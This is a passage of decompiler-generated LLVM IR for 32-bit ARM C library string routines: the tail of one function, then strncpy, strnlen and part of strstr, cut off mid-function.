  %v3_103b0 = load i8, i8* %v2_103b0, align 1
  %v4_103b0 = zext i8 %v3_103b0 to i32
  %v2_103b4 = icmp eq i8 %v3_103b0, 0
  %v1_103bc = add i32 %v0_103bc, 1
  store i32 %v1_103bc, i32* %r1.global-to-local, align 4
  br i1 %v2_103b4, label %dec_label_pc_103c4, label %dec_label_pc_10384

dec_label_pc_103c4:                               ; preds = %dec_label_pc_103b0, %dec_label_pc_10358
  %v1_103c816 = phi i32 [ %v3_10358, %dec_label_pc_10358 ], [ %v4_103b0, %dec_label_pc_103b0 ]
  %v0_103c4 = phi i32 [ %v0_103c4.pre, %dec_label_pc_10358 ], [ %v1_103bc, %dec_label_pc_103b0 ]
  %v1_103c4 = inttoptr i32 %v0_103c4 to i8*
  %v2_103c4 = load i8, i8* %v1_103c4, align 1
  %v3_103c4 = zext i8 %v2_103c4 to i32
  br label %dec_label_pc_103c8

dec_label_pc_103c8:                               ; preds = %dec_label_pc_103a8, %.thread2, %dec_label_pc_10364, %.thread3, %dec_label_pc_10374, %bb21, %dec_label_pc_103c4
  %v1_103c8 = phi i32 [ %v3_10358, %dec_label_pc_10364 ], [ %v4_103b0, %.thread3 ], [ %v3_10358, %dec_label_pc_10374 ], [ %v3_10358, %bb21 ], [ %v1_103c816, %dec_label_pc_103c4 ], [ %v4_103b0, %.thread2 ], [ %v4_103b0, %dec_label_pc_103a8 ]
  %v0_103c8 = phi i32 [ %v3_10364, %dec_label_pc_10364 ], [ 0, %.thread3 ], [ %v3_10364, %dec_label_pc_10374 ], [ %v3_10364, %bb21 ], [ %v3_103c4, %dec_label_pc_103c4 ], [ %v3_10388, %.thread2 ], [ %v3_10388, %dec_label_pc_103a8 ]
  %v2_103c8 = sub i32 %v1_103c8, %v0_103c8
  br label %dec_label_pc_103cc

dec_label_pc_103cc:                               ; preds = %entry, %dec_label_pc_103c8
  %storemerge = phi i32 [ %v2_103c8, %dec_label_pc_103c8 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_103bc, { 0, 3, 1, 2 }
  uselistorder i32 %v4_103b0, { 0, 1, 3, 2 }
  uselistorder i8 %v3_103b0, { 1, 2, 0 }
  uselistorder i32 %v1_103b0, { 1, 0 }
  uselistorder i32 %v0_10384, { 1, 0 }
  uselistorder i32 %v0_103c4.pre, { 0, 2, 1 }
  uselistorder i32 %v3_10358, { 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_103cc, { 1, 0 }
  uselistorder label %dec_label_pc_103c8, { 6, 0, 1, 3, 4, 5, 2 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_103d4 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_103dc = call i32 @__stpncpy()
  %v0_103e0 = load i32, i32* @r4, align 4
  store i32 %v3_103d4, i32* @r4, align 4
  ret i32 %v0_103e0
}

define i32 @strnlen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_103ec = load i32, i32* @r4, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v3_10404 = inttoptr i32 %arg1 to i8*
  %v4_10404 = call i32 @memchr(i8* %v3_10404, i32 0, i32 %arg2)
  %v2_10408 = icmp eq i32 %v4_10404, 0
  br i1 %v2_10408, label %entry._crit_edge, label %bb

entry._crit_edge:                                 ; preds = %entry
  %v0_10410.pre = load i32, i32* @r4, align 4
  br label %bb6

bb:                                               ; preds = %entry
  %v1_1040c = load i32, i32* %r5.global-to-local, align 4
  %v3_1040c = sub i32 %v4_10404, %v1_1040c
  br label %bb6

bb6:                                              ; preds = %entry._crit_edge, %bb
  %v0_10410 = phi i32 [ %v0_10410.pre, %entry._crit_edge ], [ %v3_1040c, %bb ]
  store i32 %v3_103ec, i32* @r4, align 4
  ret i32 %v0_10410

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10420 = load i32, i32* @r4, align 4
  store i32 %v3_10420, i32* %stack_var_-36, align 4
  %v27_10420 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_10428 = load i8, i8* %arg2, align 1
  %v2_10430 = icmp eq i8 %v3_10428, 0
  br i1 %v2_10430, label %bb, label %dec_label_pc_10454

bb:                                               ; preds = %entry
  br label %dec_label_pc_10440

dec_label_pc_10440:                               ; preds = %dec_label_pc_108f4, %dec_label_pc_108c8, %bb, %bb193, %dec_label_pc_10460, %dec_label_pc_10454, %dec_label_pc_105f4, %dec_label_pc_10580, %dec_label_pc_10578, %dec_label_pc_10540, %dec_label_pc_104cc
  %v0_10440 = phi i32 [ %arg1, %bb ], [ 0, %bb193 ], [ %v2_10454, %dec_label_pc_10460 ], [ 0, %dec_label_pc_10454 ], [ %v1_105f4, %dec_label_pc_105f4 ], [ %v1_10580, %dec_label_pc_10580 ], [ 0, %dec_label_pc_10578 ], [ 0, %dec_label_pc_10540 ], [ %v1_104cc, %dec_label_pc_104cc ], [ %v1_10828, %dec_label_pc_108f4 ], [ %v1_10828, %dec_label_pc_108c8 ]
  %v2_1044c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1044c, i32* @r4, align 4
  store i32 %v27_10420, i32* @lr, align 4
  ret i32 %v0_10440

dec_label_pc_10454:                               ; preds = %entry
  %v4_10428 = zext i8 %v3_10428 to i32
  %v2_10454 = call i32 @strchr(i32 %arg1, i32 %v4_10428)
  store i32 %v2_10454, i32* @r4, align 4
  %v3_10458 = icmp eq i32 %v2_10454, 0
  br i1 %v3_10458, label %dec_label_pc_10440, label %dec_label_pc_10460

dec_label_pc_10460:                               ; preds = %dec_label_pc_10454
  %v0_10460 = load i32, i32* %r5.global-to-local, align 4
  %v1_10460 = add i32 %v0_10460, 1
  %v2_10460 = inttoptr i32 %v1_10460 to i8*
  %v3_10460 = load i8, i8* %v2_10460, align 1
  %v4_10460 = zext i8 %v3_10460 to i32
  store i32 %v4_10460, i32* %ip.global-to-local, align 4
  %v2_10464 = icmp eq i8 %v3_10460, 0
  br i1 %v2_10464, label %dec_label_pc_10440, label %dec_label_pc_1046c

dec_label_pc_1046c:                               ; preds = %dec_label_pc_10460
  %v1_1046c = add i32 %v2_10454, 1
  %v2_1046c = inttoptr i32 %v1_1046c to i8*
  %v3_1046c = load i8, i8* %v2_1046c, align 1
  %v4_1046c = zext i8 %v3_1046c to i32
  %v2_10470 = icmp eq i8 %v3_1046c, 0
  br i1 %v2_10470, label %dec_label_pc_10578, label %dec_label_pc_10478

dec_label_pc_10478:                               ; preds = %dec_label_pc_1046c
  %v1_10478 = add i32 %v0_10460, 2
  %v2_10478 = inttoptr i32 %v1_10478 to i8*
  %v3_10478 = load i8, i8* %v2_10478, align 1
  %v4_10478 = zext i8 %v3_10478 to i32
  %v2_1047c = icmp eq i8 %v3_10478, 0
  br i1 %v2_1047c, label %dec_label_pc_10484, label %dec_label_pc_104d4

dec_label_pc_10484:                               ; preds = %dec_label_pc_10478
  %v1_10484 = inttoptr i32 %v0_10460 to i8*
  %v2_10484 = load i8, i8* %v1_10484, align 1
  %v3_10484 = zext i8 %v2_10484 to i32
  store i32 %v3_10484, i32* %r3.global-to-local, align 4
  %v1_10488 = inttoptr i32 %v2_10454 to i8*
  %v2_10488 = load i8, i8* %v1_10488, align 1
  %v3_10488 = zext i8 %v2_10488 to i32
  %v4_1048c = mul nuw nsw i32 %v3_10484, 256
  %v5_1048c = or i32 %v4_1048c, %v4_10460
  %v4_10490 = mul nuw nsw i32 %v3_10488, 256
  %v5_10490 = or i32 %v4_10490, %v4_1046c
  store i32 %v5_10490, i32* %r3.global-to-local, align 4
  %v9_10494 = icmp eq i32 %v5_1048c, %v5_10490
  br i1 %v9_10494, label %dec_label_pc_104cc, label %dec_label_pc_104a0

dec_label_pc_104a0:                               ; preds = %dec_label_pc_10484, %bb186
  %v1_104a4 = phi i32 [ %v3_104ac, %bb186 ], [ %v5_10490, %dec_label_pc_10484 ]
  %v0_104a0 = phi i32 [ %v1_104a0, %bb186 ], [ %v1_1046c, %dec_label_pc_10484 ]
  %v1_104a0 = add i32 %v0_104a0, 1
  %v2_104a0 = inttoptr i32 %v1_104a0 to i8*
  %v3_104a0 = load i8, i8* %v2_104a0, align 1
  %v4_104a0 = zext i8 %v3_104a0 to i32
  %v4_104a4 = mul nsw i32 %v1_104a4, 256
  %v4_104a4.masked = and i32 %v4_104a4, 65280
  %v3_104ac = or i32 %v4_104a0, %v4_104a4.masked
  store i32 %v3_104ac, i32* %r3.global-to-local, align 4
  %v2_104b0 = icmp eq i8 %v3_104a0, 0
  br i1 %v2_104b0, label %bb185, label %bb184

bb184:                                            ; preds = %dec_label_pc_104a0
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_104a0, %bb184
  %storemerge248 = phi i32 [ 1, %bb184 ], [ %v4_104a0, %dec_label_pc_104a0 ]
  %v0_104c4 = phi i32 [ 1, %bb184 ], [ 0, %dec_label_pc_104a0 ]
  store i32 %storemerge248, i32* %ip.global-to-local, align 4
  %v9_104b8 = icmp eq i32 %v5_1048c, %v3_104ac
  br i1 %v9_104b8, label %dec_label_pc_104c4, label %bb186

bb186:                                            ; preds = %bb185
  br i1 %v2_104b0, label %dec_label_pc_104c4, label %dec_label_pc_104a0

dec_label_pc_104c4:                               ; preds = %bb185, %bb186
  %v2_104c4 = icmp eq i32 %v0_104c4, 0
  br i1 %v2_104c4, label %dec_label_pc_10540, label %dec_label_pc_104cc

dec_label_pc_104cc:                               ; preds = %dec_label_pc_104c4, %dec_label_pc_10484
  %v0_104cc = phi i32 [ %v1_104a0, %dec_label_pc_104c4 ], [ %v1_1046c, %dec_label_pc_10484 ]
  %v1_104cc = add i32 %v0_104cc, -1
  br label %dec_label_pc_10440

dec_label_pc_104d4:                               ; preds = %dec_label_pc_10478
  %v1_104d4 = add i32 %v2_10454, 2
  %v2_104d4 = inttoptr i32 %v1_104d4 to i8*
  %v3_104d4 = load i8, i8* %v2_104d4, align 1
  %v4_104d4 = zext i8 %v3_104d4 to i32
  store i32 %v4_104d4, i32* %r6.global-to-local, align 4
  %v2_104d8 = icmp eq i8 %v3_104d4, 0
  br i1 %v2_104d8, label %dec_label_pc_10578, label %dec_label_pc_104e0

dec_label_pc_104e0:                               ; preds = %dec_label_pc_104d4
  %v1_104e0 = add i32 %v0_10460, 3
  %v2_104e0 = inttoptr i32 %v1_104e0 to i8*
  %v3_104e0 = load i8, i8* %v2_104e0, align 1
  %v4_104e0 = zext i8 %v3_104e0 to i32
  store i32 %v4_104e0, i32* %r7.global-to-local, align 4
  %v2_104e4 = icmp eq i8 %v3_104e0, 0
  br i1 %v2_104e4, label %dec_label_pc_104ec, label %dec_label_pc_10588

dec_label_pc_104ec:                               ; preds = %dec_label_pc_104e0
  %v3_104ec = mul nuw nsw i32 %v4_10478, 256
  %v1_104f0 = inttoptr i32 %v2_10454 to i8*
  %v2_104f0 = load i8, i8* %v1_104f0, align 1
  %v3_104f0 = zext i8 %v2_104f0 to i32
  %v1_104f4 = inttoptr i32 %v0_10460 to i8*
  %v2_104f4 = load i8, i8* %v1_104f4, align 1
  %v3_104f4 = zext i8 %v2_104f4 to i32
  %v3_104f8 = mul nuw nsw i32 %v4_104d4, 256
  %v4_104fc = mul nuw nsw i32 %v4_10460, 65536
  %v5_104fc = or i32 %v3_104ec, %v4_104fc
  %v4_10500 = mul nuw nsw i32 %v4_1046c, 65536
  %v5_10500 = or i32 %v3_104f8, %v4_10500
  store i32 %v5_10500, i32* %r3.global-to-local, align 4
  %v4_10504 = mul nuw i32 %v3_104f4, 16777216
  %v5_10504 = or i32 %v5_104fc, %v4_10504
  %v4_10508 = mul nuw i32 %v3_104f0, 16777216
  %v5_10508 = or i32 %v4_10508, %v5_10500
  %v9_1050c = icmp eq i32 %v5_10504, %v5_10508
  br i1 %v9_1050c, label %dec_label_pc_10580, label %dec_label_pc_10518

dec_label_pc_10518:                               ; preds = %dec_label_pc_104ec, %bb189
  %v0_1051c = phi i32 [ %v3_10520, %bb189 ], [ %v5_10508, %dec_label_pc_104ec ]
  %v0_10518 = phi i32 [ %v1_10518, %bb189 ], [ %v1_104d4, %dec_label_pc_104ec ]
  %v1_10518 = add i32 %v0_10518, 1
  %v2_10518 = inttoptr i32 %v1_10518 to i8*
  %v3_10518 = load i8, i8* %v2_10518, align 1
  %v4_10518 = zext i8 %v3_10518 to i32
  store i32 %v4_10518, i32* %r3.global-to-local, align 4
  %v2_1051c = or i32 %v4_10518, %v0_1051c
  %v3_10520 = mul i32 %v2_1051c, 256
  %v2_10524 = icmp eq i8 %v3_10518, 0
  br i1 %v2_10524, label %bb188, label %bb187

bb187:                                            ; preds = %dec_label_pc_10518
  br label %bb188

bb188:                                            ; preds = %dec_label_pc_10518, %bb187
  %storemerge247 = phi i32 [ 1, %bb187 ], [ %v4_10518, %dec_label_pc_10518 ]
  %v0_10538 = phi i32 [ 1, %bb187 ], [ 0, %dec_label_pc_10518 ]
  store i32 %storemerge247, i32* %ip.global-to-local, align 4
  %v9_1052c = icmp eq i32 %v5_10504, %v3_10520
  br i1 %v9_1052c, label %dec_label_pc_10538, label %bb189

bb189:                                            ; preds = %bb188
  br i1 %v2_10524, label %dec_label_pc_10538, label %dec_label_pc_10518

dec_label_pc_10538:                               ; preds = %bb188, %bb189
  %v2_10538 = icmp eq i32 %v0_10538, 0
  br i1 %v2_10538, label %dec_label_pc_10540, label %dec_label_pc_10580

dec_label_pc_10540:                               ; preds = %dec_label_pc_10538, %dec_label_pc_104c4
  br label %dec_label_pc_10440

dec_label_pc_10548:                               ; preds = %dec_label_pc_107f0
  store i32 %v1_10548, i32* %r6.global-to-local, align 4
  %v3_10558 = inttoptr i32 %v0_1054c to i8*
  %v4_10558 = call i32 @memchr(i8* %v3_10558, i32 0, i32 %v1_10548)
  %v2_1055c = icmp eq i32 %v4_10558, 0
  br i1 %v2_1055c, label %dec_label_pc_10940, label %dec_label_pc_10564

dec_label_pc_10564:                               ; preds = %dec_label_pc_10548
  %v0_10568 = load i32, i32* @r4, align 4
  %v2_10568 = sub i32 %v4_10558, %v0_10568
  store i32 %v2_10568, i32* %r3.global-to-local, align 4
  store i32 %v4_10558, i32* %r8.global-to-local, align 4
  %tmp249 = icmp ugt i32 %v5_10864, %v2_10568
  br i1 %tmp249, label %dec_label_pc_10578, label %dec_label_pc_10800

dec_label_pc_10578:                               ; preds = %dec_label_pc_10564, %dec_label_pc_1064c, %dec_label_pc_10638, %dec_label_pc_10588, %dec_label_pc_104d4, %dec_label_pc_1046c
  br label %dec_label_pc_10440

dec_label_pc_10580:                               ; preds = %dec_label_pc_10538, %dec_label_pc_104ec
  %v0_10580 = phi i32 [ %v1_10518, %dec_label_pc_10538 ], [ %v1_104d4, %dec_label_pc_104ec ]
  %v1_10580 = add i32 %v0_10580, -2
  br label %dec_label_pc_10440

dec_label_pc_10588:                               ; preds = %dec_label_pc_104e0
  %v1_10588 = add i32 %v2_10454, 3
  %v2_10588 = inttoptr i32 %v1_10588 to i8*
  %v3_10588 = load i8, i8* %v2_10588, align 1
  %v4_10588 = zext i8 %v3_10588 to i32
  %v2_1058c = icmp eq i8 %v3_10588, 0
  br i1 %v2_1058c, label %dec_label_pc_10578, label %dec_label_pc_10594

dec_label_pc_10594:                               ; preds = %dec_label_pc_10588
  %v1_10594 = add i32 %v0_10460, 4
  %v2_10594 = inttoptr i32 %v1_10594 to i8*
  %v3_10594 = load i8, i8* %v2_10594, align 1
  %v4_10594 = zext i8 %v3_10594 to i32
  store i32 %v4_10594, i32* %r3.global-to-local, align 4
  %v2_10598 = icmp eq i8 %v3_10594, 0
  %v1_105a0 = inttoptr i32 %v0_10460 to i8*
  %v2_105a0 = load i8, i8* %v1_105a0, align 1
  %v3_105a0 = zext i8 %v2_105a0 to i32
  br i1 %v2_10598, label %dec_label_pc_105a0, label %dec_label_pc_105fc

dec_label_pc_105a0:                               ; preds = %dec_label_pc_10594
  store i32 %v3_105a0, i32* %r3.global-to-local, align 4
  %v1_105a4 = inttoptr i32 %v2_10454 to i8*
  %v2_105a4 = load i8, i8* %v1_105a4, align 1
  %v3_105a4 = zext i8 %v2_105a4 to i32
  %v4_105a8 = mul nuw i32 %v3_105a0, 16777216
  %v4_105ac = mul nuw i32 %v3_105a4, 16777216
  %v4_105b0 = mul nuw nsw i32 %v4_10460, 65536
  %v5_105a8 = or i32 %v4_104e0, %v4_105b0
  %v5_105b0 = or i32 %v5_105a8, %v4_105a8
  store i32 %v5_105b0, i32* %r3.global-to-local, align 4
  %v4_105b4 = mul nuw nsw i32 %v4_1046c, 65536
  %v5_105ac = or i32 %v4_10588, %v4_105b4
  %v5_105b4 = or i32 %v5_105ac, %v4_105ac
  %v4_105b8 = mul nuw nsw i32 %v4_10478, 256
  %v5_105b8 = or i32 %v5_105b0, %v4_105b8
  %v4_105bc = mul nuw nsw i32 %v4_104d4, 256
  %v5_105bc = or i32 %v5_105b4, %v4_105bc
  store i32 %v5_105bc, i32* %ip.global-to-local, align 4
  %v9_105c0 = icmp eq i32 %v5_105b8, %v5_105bc
  br i1 %v9_105c0, label %dec_label_pc_105f4, label %dec_label_pc_105cc

dec_label_pc_105cc:                               ; preds = %dec_label_pc_105a0, %bb192
  %v1_105d0 = phi i32 [ %v5_105d0, %bb192 ], [ %v5_105bc, %dec_label_pc_105a0 ]
  %v0_105cc = phi i32 [ %v1_105cc, %bb192 ], [ %v1_10588, %dec_label_pc_105a0 ]
  %v1_105cc = add i32 %v0_105cc, 1
  %v2_105cc = inttoptr i32 %v1_105cc to i8*
  %v3_105cc = load i8, i8* %v2_105cc, align 1
  %v4_105cc = zext i8 %v3_105cc to i32
  store i32 %v4_105cc, i32* %r3.global-to-local, align 4
  %v4_105d0 = mul i32 %v1_105d0, 256
  %v5_105d0 = or i32 %v4_105cc, %v4_105d0
  store i32 %v5_105d0, i32* %ip.global-to-local, align 4
  %v2_105d4 = icmp eq i8 %v3_105cc, 0
  br i1 %v2_105d4, label %bb191, label %bb190

bb190:                                            ; preds = %dec_label_pc_105cc
  br label %bb191

bb191:                                            ; preds = %dec_label_pc_105cc, %bb190
  %v1_105ec = phi i32 [ 0, %dec_label_pc_105cc ], [ 1, %bb190 ]
  %v9_105dc = icmp eq i32 %v5_105b8, %v5_105d0
  br i1 %v9_105dc, label %dec_label_pc_105e8, label %bb192

bb192:                                            ; preds = %bb191
  br i1 %v2_105d4, label %dec_label_pc_105e8, label %dec_label_pc_105cc

dec_label_pc_105e8:                               ; preds = %bb191, %bb192
  %v2_105e8 = icmp eq i32 %v1_105ec, 0
  br i1 %v2_105e8, label %bb193, label %dec_label_pc_105f4

bb193:                                            ; preds = %dec_label_pc_105e8
  br label %dec_label_pc_10440

dec_label_pc_105f4:                               ; preds = %dec_label_pc_105e8, %dec_label_pc_105a0
  %v0_105f4 = phi i32 [ %v1_105cc, %dec_label_pc_105e8 ], [ %v1_10588, %dec_label_pc_105a0 ]
  %v1_105f4 = add i32 %v0_105f4, -3
  br label %dec_label_pc_10440

dec_label_pc_105fc:                               ; preds = %dec_label_pc_10594
  store i32 %v3_105a0, i32* %ip.global-to-local, align 4
  %v2_10600 = icmp eq i8 %v2_105a0, 0
  br i1 %v2_10600, label %bb194, label %dec_label_pc_10638

bb194:                                            ; preds = %dec_label_pc_105fc
  store i32 %v3_105a0, i32* %fp.global-to-local, align 4
  store i32 %v2_10454, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_106a8

dec_label_pc_10638:                               ; preds = %dec_label_pc_105fc
  store i32 %v2_10454, i32* %r8.global-to-local, align 4
  %v1_10638 = inttoptr i32 %v2_10454 to i8*
  %v2_10638 = load i8, i8* %v1_10638, align 1
  %v3_10638 = zext i8 %v2_10638 to i32
  store i32 %v3_10638, i32* %r3.global-to-local, align 4
  %v2_1063c = icmp eq i8 %v2_10638, 0
  br i1 %v2_1063c, label %dec_label_pc_10578, label %dec_label_pc_10644

dec_label_pc_10644:                               ; preds = %dec_label_pc_10638
  %v2_1065c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10658

dec_label_pc_1064c:                               ; preds = %dec_label_pc_10658
  %v0_1064c = load i32, i32* %fp.global-to-local, align 4
  %v1_1064c = load i32, i32* @r4, align 4
  %v2_1064c = add i32 %v1_1064c, %v0_1064c
  %v3_1064c = inttoptr i32 %v2_1064c to i8*
  %v4_1064c = load i8, i8* %v3_1064c, align 1
  %v6_1064c = zext i8 %v4_1064c to i32
  store i32 %v6_1064c, i32* %r3.global-to-local, align 4
  %v2_10650 = icmp eq i8 %v4_1064c, 0
  br i1 %v2_10650, label %dec_label_pc_10578, label %dec_label_pc_1064c.dec_label_pc_10658_crit_edge

dec_label_pc_1064c.dec_label_pc_10658_crit_edge:  ; preds = %dec_label_pc_1064c
  %v0_10658.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_1068c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10658

dec_label_pc_10658:                               ; preds = %dec_label_pc_1064c.dec_label_pc_10658_crit_edge, %dec_label_pc_10644
  %v1_1068c = phi i32 [ %v0_10460, %dec_label_pc_10644 ], [ %v1_1068c.pre, %dec_label_pc_1064c.dec_label_pc_10658_crit_edge ]
  %v0_10688 = phi i32 [ %v3_105a0, %dec_label_pc_10644 ], [ %v0_10658.pre, %dec_label_pc_1064c.dec_label_pc_10658_crit_edge ]
  %stack_var_-1100.1 = phi i32 [ 0, %dec_label_pc_10644 ], [ %v1_1067c, %dec_label_pc_1064c.dec_label_pc_10658_crit_edge ]
  %v3_10658 = udiv i32 %v0_10688, 32
  %v3_10660 = mul nuw nsw i32 %v3_10658, 4
  %v2_10664 = add i32 %v3_10660, %v2_1065c
  %v1_10668 = add i32 %v2_10664, -32
  %v2_10668 = inttoptr i32 %v1_10668 to i32*
  %v3_10668 = load i32, i32* %v2_10668, align 4
  %v1_1066c = urem i32 %v0_10688, 32
  %v7_10674 = shl i32 1, %v1_1066c
  %v8_10674 = or i32 %v3_10668, %v7_10674
  %v1_1067c = add i32 %stack_var_-1100.1, 1
  store i32 %v1_1067c, i32* %fp.global-to-local, align 4
  %v3_10688 = mul i32 %v0_10688, 4
  store i32 %v3_10688, i32* %r3.global-to-local, align 4
  %v2_1068c = add i32 %v1_1067c, %v1_1068c
  %v3_1068c = inttoptr i32 %v2_1068c to i8*
  %v4_1068c = load i8, i8* %v3_1068c, align 1
  %v6_1068c = zext i8 %v4_1068c to i32
  store i32 %v6_1068c, i32* %ip.global-to-local, align 4
  %v2_10694 = add i32 %v3_10688, %v2_1065c
  store i32 %v2_10694, i32* %r3.global-to-local, align 4
  %v2_10698 = icmp eq i8 %v4_1068c, 0
  store i32 %v8_10674, i32* %v2_10668, align 4
  %v0_106a0 = load i32, i32* %fp.global-to-local, align 4
  %v1_106a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_106a0 = add i32 %v1_106a0, -1056
  %v3_106a0 = inttoptr i32 %v2_106a0 to i32*
  store i32 %v0_106a0, i32* %v3_106a0, align 4
  br i1 %v2_10698, label %dec_label_pc_106a8, label %dec_label_pc_1064c

dec_label_pc_106a8:                               ; preds = %dec_label_pc_10658, %bb194
  %v5_10864 = phi i32 [ %v3_105a0, %bb194 ], [ %v1_1067c, %dec_label_pc_10658 ]
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_106bc.outer

dec_label_pc_106bc.outer:                         ; preds = %bb196, %dec_label_pc_106a8
  %storemerge240 = phi i32 [ 0, %dec_label_pc_106a8 ], [ %v0_10700120126133, %bb196 ]
  %v1_1070c.ph = phi i32 [ 0, %dec_label_pc_106a8 ], [ %v0_10700120126133, %bb196 ]
  %stack_var_-1104.0.ph = phi i32 [ -1, %dec_label_pc_106a8 ], [ %stack_var_-1104.1, %bb196 ]
  %v1_10708.ph = phi i32 [ 1, %dec_label_pc_106a8 ], [ %v4_106fc134, %bb196 ]
  %v3_1078c.ph = phi i32 [ -1, %dec_label_pc_106a8 ], [ %v2_106c040128132, %bb196 ]
  br label %dec_label_pc_106bc.outer214

dec_label_pc_106bc.outer214:                      ; preds = %dec_label_pc_106bc.outer, %bb198
  %storemerge241 = phi i32 [ %storemerge240, %dec_label_pc_106bc.outer ], [ %v2_106c8, %bb198 ]
  %v1_1070c.ph215 = phi i32 [ %v1_1070c.ph, %dec_label_pc_106bc.outer ], [ %v2_106c8, %bb198 ]
  br label %dec_label_pc_106bc

dec_label_pc_106bc:                               ; preds = %dec_label_pc_106bc.outer214, %bb197
  %storemerge242 = phi i32 [ %storemerge241, %dec_label_pc_106bc.outer214 ], [ %v1_1070c.ph215, %bb197 ]
  %v0_1071010 = phi i32 [ 1, %dec_label_pc_106bc.outer214 ], [ %v1_10710, %bb197 ]
  store i32 %storemerge242, i32* %ip.global-to-local, align 4
  %v2_106c4 = add i32 %v3_1078c.ph, %v0_1071010
  store i32 %v2_106c4, i32* %r3.global-to-local, align 4
  %v2_106c8 = add i32 %v0_1071010, %v1_1070c.ph215
  %v3_106cc = icmp ult i32 %v2_106c8, %v5_10864
  br i1 %v3_106cc, label %dec_label_pc_106d4, label %dec_label_pc_10720

dec_label_pc_106d4:                               ; preds = %dec_label_pc_106bc
  %v1_106d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_106d4 = add i32 %v1_106d4, %v2_106c4
  %v3_106d4 = inttoptr i32 %v2_106d4 to i8*
  %v4_106d4 = load i8, i8* %v3_106d4, align 1
  %v2_106d8 = add i32 %v1_106d4, %v2_106c8
  %v3_106d8 = inttoptr i32 %v2_106d8 to i8*
  %v4_106d8 = load i8, i8* %v3_106d8, align 1
  %v6_106d8 = zext i8 %v4_106d8 to i32
  store i32 %v6_106d8, i32* %r3.global-to-local, align 4
  %v9_106dc = icmp eq i8 %v4_106d4, %v4_106d8
  br i1 %v9_106dc, label %dec_label_pc_10708, label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106d4
  %v3_106dc = icmp ult i8 %v4_106d4, %v4_106d8
  br i1 %v3_106dc, label %bb195, label %.thread

.thread:                                          ; preds = %dec_label_pc_106e4
  %v6_106f8 = sub i32 %v2_106c8, %v3_1078c.ph
  store i32 %v6_106f8, i32* %sl.global-to-local, align 4
  br label %bb196

bb195:                                            ; preds = %dec_label_pc_106e4
  store i32 1, i32* %sl.global-to-local, align 4
  %v5_106ec122131136 = add i32 %v1_1070c.ph215, 1
  br label %bb196

bb196:                                            ; preds = %.thread, %bb195
  %stack_var_-1104.1 = phi i32 [ %stack_var_-1104.0.ph, %.thread ], [ %v1_1070c.ph215, %bb195 ]
  %v2_106c040128132 = phi i32 [ %v3_1078c.ph, %.thread ], [ %v1_1070c.ph215, %bb195 ]
  %v4_106fc134 = phi i32 [ %v6_106f8, %.thread ], [ 1, %bb195 ]
  %v0_10700120126133 = phi i32 [ %v2_106c8, %.thread ], [ %v5_106ec122131136, %bb195 ]
  br label %dec_label_pc_106bc.outer

dec_label_pc_10708:                               ; preds = %dec_label_pc_106d4
  %v9_10708 = icmp eq i32 %v0_1071010, %v1_10708.ph
  br i1 %v9_10708, label %bb198, label %bb197

bb197:                                            ; preds = %dec_label_pc_10708
  %v1_10710 = add i32 %v0_1071010, 1
  br label %dec_label_pc_106bc

bb198:                                            ; preds = %dec_label_pc_10708
  br label %dec_label_pc_106bc.outer214

dec_label_pc_10720:                               ; preds = %dec_label_pc_106bc
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10730.outer

dec_label_pc_10730.outer:                         ; preds = %bb199, %dec_label_pc_10720
  %storemerge243 = phi i32 [ 0, %dec_label_pc_10720 ], [ %v0_1076c, %bb199 ]
  %v1_10778.ph = phi i32 [ 0, %dec_label_pc_10720 ], [ %v0_1076c, %bb199 ]
  %v4_1079c.ph = phi i32 [ 1, %dec_label_pc_10720 ], [ %v1_1077476, %bb199 ]
  %v4_107b0.ph = phi i32 [ -1, %dec_label_pc_10720 ], [ %v1_1073c62, %bb199 ]
  br label %dec_label_pc_10730.outer212

dec_label_pc_10730.outer212:                      ; preds = %dec_label_pc_10730.outer, %bb201
  %storemerge244 = phi i32 [ %storemerge243, %dec_label_pc_10730.outer ], [ %v2_10734, %bb201 ]
  %v1_10778.ph213 = phi i32 [ %v1_10778.ph, %dec_label_pc_10730.outer ], [ %v2_10734, %bb201 ]
  br label %dec_label_pc_10730

dec_label_pc_10730:                               ; preds = %dec_label_pc_10730.outer212, %bb200
  %storemerge245 = phi i32 [ %storemerge244, %dec_label_pc_10730.outer212 ], [ %v1_10778.ph213, %bb200 ]
  %v0_1077c22 = phi i32 [ 1, %dec_label_pc_10730.outer212 ], [ %v1_1077c, %bb200 ]
